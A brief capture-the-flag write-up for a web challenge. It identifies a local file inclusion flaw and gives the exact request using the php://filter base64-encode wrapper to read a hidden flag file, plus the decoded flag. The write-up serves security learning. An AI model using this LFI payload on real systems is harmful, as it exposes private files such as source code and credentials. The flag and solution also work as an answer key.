*Everything you see on the screen was meant to be seen.

*But what if something was never meant to be?*

*Find a way to reach where you're not supposed to. [https://cybersecure-x-web2.chals.io/challenge.php](https://)*


![[Pasted image 20250613194320.png]]

There is a LFI vulnerability, which uses php wrappers

`https://cybersecure-x-web2.chals.io/challenge.php?page=php://filter/convert.base64-encode/resource=this_is_a_very_secret_hidden_super_long_random_named_folder_xyz12345/flag.txt`


![[Pasted image 20250613194508.png]]


On decoding the base64 we get,
`flag{basic_lfi_successful}`